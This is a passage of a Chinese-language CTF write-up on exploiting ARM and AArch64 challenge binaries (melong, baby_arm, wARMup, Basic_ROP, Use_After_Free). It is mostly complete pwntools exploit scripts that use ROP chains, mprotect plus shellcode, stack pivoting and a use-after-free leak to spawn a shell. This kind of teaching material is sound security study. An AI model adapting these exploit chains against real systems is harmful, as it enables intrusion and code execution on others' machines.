if __name__ == "__main__":
    padding = 112
    if padding is null:
        padding = get_padding_length()
        log.success('We get padding length is ' + str(get_padding_length()))
    sh = get_sh()
    payload='A' * padding + p32(0x00020904) + p32(0x0006c384) + p32(0x0006c384) + p32(0x000110B4)
    sh.recvuntil('if you want to quitn')
    sh.send('n')
    sh.recvrepeat(0.3)
    sh.sendline(payload)
    flag=get_flag(sh)
    log.success('The flag is '+flag)
    sh.close()
```

### <a class="reference-link" name="%E4%BB%A5Codegate2018_melong%E4%B8%BA%E4%BE%8B"></a>以Codegate2018_melong为例

#### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"></a>程序分析

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-02-140236.png)

32位ARM动态链接程序，仅开启NX保护。

题目是一个BMI指数计算和记录程序，write_diary存在明显的栈溢出漏洞，溢出的长度由我们的`BMI指数`决定，此处若我们使得`nbyte`为-1就可以获得一个近乎无限长度的溢出了~

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-02-141235.png)

分析main函数可以得知，我们若想进入write_diary函数，必须使得`BMI_num`不为空，而`BMI_num`由PT函数计算得到，那么就必须保证`v5`不为空，因此，我们必须进入的函数有`Check`、`PT`这两个函数。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-02-142541.png)

那么先分析PT函数

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-02-144420.png)

可以发现，程序没有任何的限制，那么我们直接进入Check函数，跟进流程即可，进入PT函数后直接输入-1即可获取溢出点。

#### <a class="reference-link" name="%E6%9E%84%E9%80%A0payload"></a>构造payload

##### <a class="reference-link" name="Leak%20Libc"></a>Leak Libc

首先，在main函数，可以确定需要padding的长度为0x54。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-02-150714.png)

⚠️：此时，在ARM程序中，要特别注意，我们无需覆盖BP指针的值，我们之前说过(见上文的堆栈规则)ARM下的入栈顺序，可以看到事实上返回地址之前并没有BP指针需要伪造。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-03-035533.png)

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-02-150940.png)

然后利用`ROPgadget`可以获取程序里可供利用的`gadget`。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-03-040249.png)

此处我们选用`0x00011bbc : pop {r0, pc}`

那么可以构造payload。

`payload = 'A'*0x54 + p32(0x00011bbc) + p32(melong.got['puts']) + p32(melong.plt['puts'])`

然后我们进行调试，注意，我们需要调试时，程序的启动方式需要变更。

```
def get_sh(other_libc = null):
    global libc
    if args['REMOTE']:
        if other_libc is not null:
            libc = ELF("./", checksec = False)
        return remote(sys.argv[1], sys.argv[2])
    elif remote_gdb:
        sh = process(["qemu-arm", "-g", "2333", "-L", "/usr/arm-linux-gnueabi", "./melong"])
        log.info('Please use GDB remote!(Enter to continue)')
        raw_input()
        return sh
    else :
        return process(["qemu-arm", "-L", "/usr/arm-linux-gnueabi", "./melong"])
```

需要在本地启动一个gdb server，然后新开一个终端窗口进行附加。

我们在main函数返回处下断~

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-03-120811.png)

可以看到，执行流确实被我们劫持了，并且程序确实输出了`puts`的`GOT`表地址。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-07-151107.png)

##### <a class="reference-link" name="%E8%BF%94%E5%9B%9Emain%E5%87%BD%E6%95%B0"></a>返回main函数

接下来我们想要让程序返回main函数从而做二次利用。

但是在调试时发现程序在进入puts函数时`IR`寄存器的值并没有发生变化，这导致在puts函数执行结束后程序会回到`0x0011270`的位置，这将会导致程序再次执行`LDMFD SP!, {R11,PC}`。进而导致栈混乱。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-07-153456.png)

##### <a class="reference-link" name="%E9%9D%99%E6%80%81libc%E5%8A%A0%E8%BD%BD%EF%BC%9F"></a>静态libc加载？

接下来我们发现，连续的两次泄露中，puts的got表地址并没有发生变化，也就是说！这里的libc文件可能是静态加载到程序里的！那么我们可以直接构造最终的exploit！

#### <a class="reference-link" name="Final%20Exploit"></a>Final Exploit

```
from pwn import *
import sys
context.log_level='debug'
context.arch='arm'
remote_gdb=False

melong=ELF('./melong')

libc=ELF("/usr/arm-linux-gnueabi/lib/libc.so.6", checksec = False)

def get_sh(other_libc = null):
    global libc
    if args['REMOTE']:
        if other_libc is not null:
            libc = ELF("./libc-2.30.so", checksec = False)
        return remote(sys.argv[1], sys.argv[2])
    elif remote_gdb:
        sh = process(["qemu-arm", "-g", "2333", "-L", "/usr/arm-linux-gnueabi", "./melong"])
        log.info('Please use GDB remote!(Enter to continue)')
        raw_input()
        return sh
    else :
        return process(["qemu-arm", "-L", "/usr/arm-linux-gnueabi", "./melong"])

def get_address(sh,arch_num=null,info=null,start_string=null,end_string=null,int_mode=False):
    sh.recvuntil(start_string)
    if int_mode :
        return_address=int(sh.recvuntil(end_string).strip(end_string),16)
    elif arch_num == 64:
        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
    log.success(info+str(hex(return_address)))
    return return_address

def get_flag(sh):
    sh.sendline('cat /flag')
    return sh.recvrepeat(0.3)

if __name__ == "__main__":
    # print(args['DEBUG'])
    sh = get_sh(True)
    libc_base = 0xff6b6f98 - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    binsh_addre = libc_base + libc.search('/bin/sh').next()
    # payload  = 'A' * 0x54 + p32(0x00011bbc) + p32(melong.got['puts']) + p32(melong.plt['puts'])
    payload  = 'A' * 0x54 + p32(0x00011bbc) + p32(binsh_addre) + p32(system_addr)
    sh.recvuntil('Type the number:')
    sh.sendline('1')
    sh.recvuntil('Your height(meters) : ')
    sh.sendline('1')
    sh.recvuntil('Your weight(kilograms) : ')
    sh.sendline('1')
    sh.recvuntil('Type the number:')
    sh.sendline('3')
    sh.recvuntil('How long do you want to take personal training?')
    sh.sendline('-1')
    sh.recvuntil('Type the number:')
    sh.sendline('4')
    sh.sendline(payload)
    sh.recvuntil('Type the number:')
    sh.sendline('6')
    flag=get_flag(sh)
    log.success('The flag is '+flag)
```

### <a class="reference-link" name="%E4%BB%A5Shanghai2018%20-%20baby_arm%E4%B8%BA%E4%BE%8B"></a>以Shanghai2018 – baby_arm为例

#### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"></a>程序分析

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-08-020704.png)

64位aarch架构程序，仅开启NX保护。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-08-021054.png)

`main`函数的逻辑相当简单，在`read_200`的函数中，可以发现存在明显的栈溢出。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-08-064824.png)

因此我们可以构造Payload。

#### <a class="reference-link" name="%E6%9E%84%E9%80%A0payload"></a>构造payload

首先我们想要把shellcode写到BSS段，然后发现程序中存在`mprotect`函数的调用痕迹。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-16-144258.png)

那么我们可以利用`mprotect`函数修改BSS段的权限为可执行权限，然后将Shellcode放在BSS段上，跳转执行即可。

然后我们读一下汇编码~

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-16-145147.png)

看到进入函数时对SP指针进行了-0x50的操作，之后又将其+0x10作为参数传入read函数。

那么我们是无法劫持这个函数的PC指针的，这个函数的Stack结构如下。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-17-032802.png)

可见，我们无法篡改X29和X30寄存器，但是！当此函数执行完毕后，SP指针会回到Buf的结束位置，之后main函数会直接从那里取出地址返回，我们就可以劫持main函数的PC指针。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-17-033156.png)

那么padding长度必定为0x40，然后覆盖X29寄存器的值，然后就能覆盖X30(返回地址所在寄存器)

`padding = 'A' * 0x40 + p64(0xdeadbeef)`

接下来我们需要控制`X0-X3`寄存器，以完成`mprotect(0x411000,0x1000,7)`的构造。

很可惜，没有符合要求的gadget~

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-16-151622.png)

但是我们在程序中发现了这样的代码：

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-16-151727.png)

可以看到这段代码非常像我们在Intel/AMD架构下利用的`ret2csu`的代码，那么此处我们可以进行利用。

自`0x4008CC`处的代码开始，程序会依次对`X19、X20、X21、X22、X23、X24、X29、X30`赋值。

⚠️：**此处请特别注意！X29，X30取的是SP指针指向处的值，因此在栈上应当布置成`X29、X30、X19、X20、X21、X22、X23、X24`的顺序！**

我们若接下来将PC劫持到`0x4008AC`处，程序将执行`LDR X3,[X21,X19,LSL#3]`，那么此句汇编的意义是，将X19的值逻辑左移(Logical Shift Left)三位后加上X21的值，**取其所指向的值**存储在X3寄存器中。接下来是把X22寄存器的值作为第三个参数，把X23寄存器的值作为第二个参数，把X24寄存器的值(的低32位)作为第一个参数，给X19寄存器的值加一，调用X3寄存器所指向的函数。

我们只需要控制X19为0，`LDR X3,[X21,X19,LSL#3]`其实就是`LDR X3,[X21]`那么我们需要找一个可控地址写入`mprotect[@plt](https://github.com/plt)`，此时BSS就成了我们的最佳选择。

那么我们可以构造此处的payload：

```
payload  = padding + p64(0x4008CC)       # X19 , X20
payload += p64(0xdeadbeef)               # X29
payload += p64(0x4008AC)                 # X30
payload += p64(0) + p64(1)               # X19 , X20
payload += p64(0x411068 + 0x100)         # X21
payload += p64(0x7)                      # X22
payload += p64(0x1000)                   # X23
payload += p64(0x411000)              # X24
```

接下来，我们需要让程序继续返回溢出函数，以劫持PC到shellcode处。

```
payload += p64(0xdeadbeef)               # X29
payload += p64(0x4007F0)                 # X30
payload += p64(0) * 0x6                  # X19 - X24
```

于是，完整的payload为

```
shell_code = asm(shellcraft.sh())
shell_code = shell_code.ljust(0x100,'x90')
shell_code = shell_code + p64(baby_arm.plt['mprotect'])
padding  = 'A' * 0x40 + p64(0xdeadbeef)
payload  = padding + p64(0x4008CC)       # X19 , X20
payload += p64(0xdeadbeef)               # X29
payload += p64(0x4008AC)                 # X30
payload += p64(0) + p64(1)               # X19 , X20
payload += p64(0x411068 + 0x100)         # X21
payload += p64(0x7)                      # X22
payload += p64(0x1000)                   # X23
payload += p64(0x411000)                 # X24
payload += p64(0xdeadbeef)               # X29
payload += p64(0x400068)                 # X30
payload += p64(0) * 0x6                  # X19 - X24
```

#### <a class="reference-link" name="Final%20exploit"></a>Final exploit

```
from pwn import *
import sys
context.log_level='debug'
context.arch='aarch64'
Debug = False

shanghai2018_baby_arm=ELF('./shanghai2018_baby_arm', checksec = False)

libc=ELF("/usr/aarch64-linux-gnu/lib/libc.so.6", checksec = False)

def get_sh(other_libc = null):
    global libc
    if args['REMOTE']:
        if other_libc is not null:
            libc = ELF("./", checksec = False)
        return remote(sys.argv[1], sys.argv[2])
    elif Debug:
        sh = process(["qemu-aarch64", "-g", "2333", "-L", "/usr/aarch64-linux-gnu", "./shanghai2018_baby_arm"])
        log.info('Please use GDB remote!(Enter to continue)')
        raw_input()
        return sh
    else :
        return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", "./shanghai2018_baby_arm"])

def get_address(sh,arch_num=null,info=null,start_string=null,end_string=null,int_mode=False):
    sh.recvuntil(start_string)
    if int_mode :
        return_address=int(sh.recvuntil(end_string).strip(end_string),16)
    elif arch_num == 64:
        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
    log.success(info+str(hex(return_address)))
    return return_address

def get_flag(sh):
    sh.sendline('cat /flag')
    return sh.recvrepeat(0.3)

if __name__ == "__main__":
    sh = get_sh()
    shell_code = asm(shellcraft.sh())
    shell_code = shell_code.ljust(0x100,'x90')
    shell_code = shell_code + p64(shanghai2018_baby_arm.plt['mprotect'])
    padding  = 'A' * 0x40 + p64(0xdeadbeef)
    payload  = padding + p64(0x4008CC)       # X19 , X20
    payload += p64(0xdeadbeef)               # X29
    payload += p64(0x4008AC)                 # X30
    payload += p64(0) + p64(1)               # X19 , X20
    payload += p64(0x411068 + 0x100)         # X21
    payload += p64(0x7)                      # X22
    payload += p64(0x1000)                   # X23
    payload += p64(0x411000)                 # X24
    payload += p64(0xdeadbeef)               # X29
    payload += p64(0x411068)                 # X30
    payload += p64(0) * 0x6                  # X19 - X24
    sh.recvuntil('Name:')
    sh.sendline(shell_code)
    sh.sendline(payload)
    sh.interactive()
    flag=get_flag(sh)
    log.success('The flag is '+flag)
```

### <a class="reference-link" name="%E4%BB%A5inctf2018-warmup%E4%B8%BA%E4%BE%8B"></a>以inctf2018-warmup为例

#### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"></a>程序分析

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-17-070759.png)

程序为ARM-32-dynamically linked程序。

明显存在栈溢出漏洞。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-17-070904.png)

但是这次我们只能溢出0x10个字节，并且程序中看似没有什么好用的gadget。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-17-074924.png)

注意到程序中存在一个可以控制R3的gadget，并且可以利用main函数中的汇编语句完成任意地址写。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-17-075222.png)

那么我们可以向BSS段写入shellcode并执行。

#### <a class="reference-link" name="Final%20Exploit"></a>Final Exploit

```
from pwn import *
import sys
context.log_level='debug'
context.arch='arm'

Deb =False

wARMup=ELF('./wARMup', checksec = False)

libc=ELF("/usr/arm-linux-gnueabi/lib/libc.so.6", checksec = False)

def get_sh(other_libc = null):
    global libc
    if args['REMOTE']:
        if other_libc is not null:
            libc = ELF("./", checksec = False)
        return remote(sys.argv[1], sys.argv[2])
    elif Deb:
        sh = process(["qemu-arm", "-g", "2333", "-L", "/usr/arm-linux-gnueabihf", "./wARMup"])
        log.info('Please use GDB remote!(Enter to continue)')
        raw_input()
        return sh
    else :
        return process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./wARMup"])

def get_address(sh,arch_num=null,info=null,start_string=null,end_string=null,int_mode=False):
    sh.recvuntil(start_string)
    if int_mode :
        return_address=int(sh.recvuntil(end_string).strip(end_string),16)
    elif arch_num == 64:
        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
    log.success(info+str(hex(return_address)))
    return return_address

def get_flag(sh):
    sh.sendline('cat /flag')
    return sh.recvrepeat(0.3)

if __name__ == "__main__":
    shellcode = asm(shellcraft.sh())
    sh = get_sh()
    payload  = 'A' * 0x64 + p32(wARMup.bss() + 0x300) + p32(0x0010364) + p32(wARMup.bss() + 0x300) + p32(0x0010530)
    sh.recvuntil('Welcome to bi0s CTF!')
    sh.sendline(payload)
    sh.sendline(p32(wARMup.bss() + 0x304) + shellcode)
    sh.interactive()
    flag=get_flag(sh)
    log.success('The flag is '+flag)
```

### <a class="reference-link" name="%E4%BB%A5Stack_buffer_overflow_basic%E4%B8%BA%E4%BE%8B"></a>以Stack_buffer_overflow_basic为例

#### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"></a>程序分析

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-17-115344.png)

程序为ARM-32-dynamically linked程序。

使用IDA分析发现程序逻辑并不是十分明了的。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-17-115502.png)

但是试运行后发现程序逻辑较为明确，可以发现我们可以向栈上写入数据，且数据的起始地址程序会告诉我们，于是可以很明确的构造ret2shellcode。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-17-115702.png)

#### <a class="reference-link" name="Final%20Exploit"></a>Final Exploit

```
from pwn import *
import sys
context.log_level='debug'
context.arch='arm'

Stack_buffer_overflow_basic=ELF('./Stack_buffer_overflow_basic', checksec = False)

libc=ELF("/usr/arm-linux-gnueabihf/lib/libc.so.6", checksec = False)

def get_sh(other_libc = null):
    global libc
    if args['REMOTE']:
        if other_libc is not null:
            libc = ELF("./", checksec = False)
        return remote(sys.argv[1], sys.argv[2])
    elif False:
        sh = process(["qemu-arm", "-g", "2333", "-L", "/usr/arm-linux-gnueabihf", "./Stack_buffer_overflow_basic"])
        log.info('Please use GDB remote!(Enter to continue)')
        raw_input()
        return sh
    else :
        return process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./Stack_buffer_overflow_basic"])

def get_address(sh,arch_num=null,info=null,start_string=null,end_string=null,int_mode=False):
    sh.recvuntil(start_string)
    if int_mode :
        return_address=int(sh.recvuntil(end_string).strip(end_string),16)
    elif arch_num == 64:
        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
    log.success(info+str(hex(return_address)))
    return return_address

def get_flag(sh):
    sh.sendline('cat /flag')
    return sh.recvrepeat(0.3)

if __name__ == "__main__":
    sh = get_sh()
    sh.recvuntil('Give me data to dump:')
    sh.sendline('A')
    shellcode_addr = get_address(sh,32,'We get shellcode address is ','0x',':',True)
    shellcode = asm(shellcraft.sh())
    payload = shellcode.ljust(0xA4,'x90') + p32(shellcode_addr)
    sh.recvuntil('Dump again (y/n):')
    sh.sendline('y')
    sh.recvuntil('Give me data to dump:')
    sh.sendline(payload)
    sh.recvuntil('Dump again (y/n):')
    sh.sendline('n')
    sh.interactive()
    flag=get_flag(sh)
    log.success('The flag is '+flag)
```

### <a class="reference-link" name="%E4%BB%A5Basic_ROP%E4%B8%BA%E4%BE%8B%20%E2%80%94%E2%80%94%20%E6%A0%88%E8%BF%81%E7%A7%BB%E5%AE%9E%E4%BE%8B"></a>以Basic_ROP为例 —— 栈迁移实例

#### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"></a>程序分析

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-17-115930.png)

程序为ARM-32-dynamically linked程序。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-17-121431.png)

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-17-121529.png)

此处明显存在栈溢出，因为a1的值没有限定长度，但是程序中没有合适的gadget可供利用，因此还是利用ret2csu来进行利用。

首先通过调试可以确定劫持返回地址的位置。(`payload = 'x41' * 0x44 + 'BBBB'`)

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-18-012935.png)

padding确定之后就开始寻找程序中可能存在的gadget

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-18-020120.png)

发现只有控制R3的较为方便的指针，接下来发现main函数中可以利用R3寄存器间接控制R1寄存器实现任意地址写，以及间接控制R0寄存器。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-18-061903.png)

那么我们的思路就是利用**栈迁移**，将栈迁移到BSS段实现利用。

#### <a class="reference-link" name="Final%20Exploit"></a>Final Exploit

```
from pwn import *
import sys
context.log_level='debug'
context.arch='arm'

Basic_ROP=ELF('./Basic_ROP', checksec = False)

libc=ELF("/usr/arm-linux-gnueabihf/lib/libc.so.6", checksec = False)

def get_sh(other_libc = null):
    global libc
    if args['REMOTE']:
        if other_libc is not null:
            libc = ELF("./", checksec = False)
        return remote(sys.argv[1], sys.argv[2])
    elif False:
        sh = process(["qemu-arm", "-g", "2333", "-L", "/usr/arm-linux-gnueabihf", "./Basic_ROP"])
        log.info('Please use GDB remote!(Enter to continue)')
        raw_input()
        return sh
    else :
        return process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./Basic_ROP"])

def get_address(sh,arch_num=null,info=null,start_string=null,end_string=null,int_mode=False):
    sh.recvuntil(start_string)
    if int_mode :
        return_address=int(sh.recvuntil(end_string).strip(end_string),16)
    elif arch_num == 64:
        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
    log.success(info+str(hex(return_address)))
    return return_address

def get_flag(sh):
    sh.sendline('cat /flag')
    return sh.recvrepeat(0.3)

if __name__ == "__main__":
    sh = get_sh()
    payload  =  'x41' * 0x40 + p32(Basic_ROP.bss(0x500)) + p32(0x000103F8)      # Padding + return_addr
    payload +=  p32(Basic_ROP.bss() + 0x500 - 0x4 * 3)         # R3
    payload +=  p32(0x0001065C)                       # PC
    sh.recvuntil('Give me data to dump:')
    sh.sendline(payload)
    payload  =  '/bin/shx00'                   
    payload +=  p32(Basic_ROP.bss() + 0x500 + 0x120 - 0x4 * 4) # R11
    payload +=  p32(0x000103F8)                               # return_addr
    payload +=  p32(Basic_ROP.bss() + 0x500 - 0x10 + 0x4)     # R3
    payload +=  p32(0x0001062C)                            # PC
    payload +=  'x00' * 0x100
    payload +=  p32(0xDeadbeef)                            # R11
    payload +=  p32(0x00010574)                            # return_addr
    # payload +=  p32(Basic_ROP.plt['system'])                            # return_addr
    sh.sendline(payload)
    sh.interactive()
    flag=get_flag(sh)
    log.success('The flag is '+flag)
```

### <a class="reference-link" name="%E4%BB%A5Use_After_Free%E4%B8%BA%E4%BE%8B%20%E2%80%94%E2%80%94%20%E5%A0%86%E5%88%A9%E7%94%A8%E5%AE%9E%E4%BE%8B"></a>以Use_After_Free为例 —— 堆利用实例

#### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"></a>程序分析

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-18-123453.png)

程序为ARM-32-dynamically linked程序。

#### <a class="reference-link" name="%E5%88%86%E6%9E%90%E9%A2%98%E7%9B%AE%E9%80%BB%E8%BE%91&amp;%E6%8E%A2%E6%B5%8B%E6%BC%8F%E6%B4%9E%E7%82%B9"></a>分析题目逻辑&amp;探测漏洞点

首先使用IDA尝试分析，发现程序逻辑较为混乱，无法顺利的理清楚。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-18-124329.png)

##### <a class="reference-link" name="%E6%8E%A2%E6%B5%8BUAF%E6%BC%8F%E6%B4%9E"></a>探测UAF漏洞

那么我们首先尝试运行，

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-18-124441.png)

发现是一个常见的表单题，除了常见的增删改查以外还提供了很多选项，但令我们很在意的是，程序在增删改查时，提供了`alias`作为索引！那么推测我们如果按index释放后是否没有把alias索引清空，经过测试，果然发现存在`Use-After-Free`漏洞！

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-18-125026.png)

##### <a class="reference-link" name="%E6%8E%A2%E6%B5%8BDouble%20Free%E6%BC%8F%E6%B4%9E"></a>探测Double Free漏洞

接下来我们尝试触发double free漏洞

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-18-125647.png)

验证存在！

##### <a class="reference-link" name="%E5%88%86%E6%9E%90%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"></a>分析数据结构

此处我们使用动态调试的方式，因为远程调试的原因导致我们的heap命令无法使用，于是我们在menu处下断，然后查看teams数组内的内容，就可以看到每个成员的情况。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-18-134756.png)

此处我们可以分析出，程序会直接申请一个大小为0x3C大小的Chunk用于存放name，并在name的最后四字节放上Description的chunk的data域指针，Description会根据我们的输入大小进行分配，然后程序会再分配一个大小为0x14的Chunk，分别存放name的chunk的data域指针，Alias。

这一点也可以在静态分析中得到佐证：

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-18-135650.png)

##### <a class="reference-link" name="Delete%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"></a>Delete函数分析

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-18-135856.png)

对delete函数静态分析后也可以佐证我们之前的探测。

##### <a class="reference-link" name="Edit%20%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90%E2%80%94%E2%80%94%E5%8F%A6%E4%B8%80%E4%B8%AAfree%E7%9A%84%E6%9C%BA%E4%BC%9A%EF%BC%81"></a>Edit 函数分析——另一个free的机会！

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-18-141803.png)

也就是说，如果我们更新的Description若更长，程序会free掉旧的，malloc一个更长的Chunk。

#### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

那么我们其实可以很容易的分析出，若我们能控制name这个chunk的最后四字节，我们事实上拥有了一个任意地址读写的能力！

#### <a class="reference-link" name="Final%20Exploit"></a>Final Exploit

```
from pwn import *
import sys
context.log_level='debug'
context.arch='arm'

Use_After_Free=ELF('./Use_After_Free', checksec = False)

libc=ELF("/usr/arm-linux-gnueabihf/lib/libc.so.6", checksec = False)

def get_sh(other_libc = null):
    global libc
    if args['REMOTE']:
        if other_libc is not null:
            libc = ELF("./libc-2.24.so", checksec = False)
        return remote(sys.argv[1], sys.argv[2])
    elif False:
        sh = process(["qemu-arm", "-g", "2333", "-L", "/usr/arm-linux-gnueabihf", "./Use_After_Free"])
        log.info('Please use GDB remote!(Enter to continue)')
        raw_input()
        return sh
    else :
        return process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./Use_After_Free"])

def get_address(sh,arch_num=null,info=null,start_string=null,end_string=null,int_mode=False):
    sh.recvuntil(start_string)
    if int_mode :
        return_address=int(sh.recvuntil(end_string).strip(end_string),16)
    elif arch_num == 64:
        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
    log.success(info+str(hex(return_address)))
    return return_address

def get_flag(sh):
    sh.sendline('cat /flag')
    return sh.recvrepeat(0.3)

def creat(sh,Chunk_alias,Team,Desc):
    sh.recvuntil(': ')
    sh.sendline('add' + ' ' + Chunk_alias)
    sh.recvuntil('Team: ')
    sh.sendline(Team)
    sh.recvuntil('Desc: ')
    sh.sendline(Desc)

def delete(sh,index=null,Chunk_alias=null):
    sh.recvuntil(': ')
    if Chunk_alias != null:
        sh.sendline('del' + ' ' + Chunk_alias)
    else:
        sh.sendline('del')
        sh.recvuntil('Index: ')
        sh.sendline(str(index))

def show(sh,index=null,Chunk_alias=null):
    sh.recvuntil(': ')
    if Chunk_alias != null:
        sh.sendline('show' + ' ' + Chunk_alias)
    else:
        sh.sendline('show')
        sh.recvuntil('Index: ')
        sh.sendline(str(index))

def edit(sh,Team,Desc,Point,index=null,Chunk_alias=null):
    sh.recvuntil(': ')
    if Chunk_alias != null:
        sh.sendline('edit' + ' ' + Chunk_alias)
    else:
        sh.sendline('edit')
        sh.recvuntil('Index: ')
        sh.sendline(str(index))
        sh.recvuntil('Team: Team: ')
        sh.sendline(Team)
        sh.recvuntil('Desc: ')
        sh.sendline(Desc)
        sh.recvuntil('Points: ')
        sh.sendline(str(Point))

if __name__ == "__main__":
    sh = get_sh(True)
    creat(sh,'Chunk__0','Chunk__0','A' * (0x20 - 1))
    creat(sh,'Chunk__1','Chunk__1','A' * (0x20 - 1))
    creat(sh,'Chunk__2','Chunk__2','A' * (0x20 - 1))
    creat(sh,'Chunk__3','/bin/shx00','/bin/shx00')
    delete(sh,1)
    edit(sh,'Chunk__2','A' * 0x38 + p32(Use_After_Free.got['free']),2,2)
    show(sh,1,'Chunk__1')
    sh.recvuntil('  Desc:  ')
    libc_base = u32(sh.recv(4)) - libc.symbols['free']
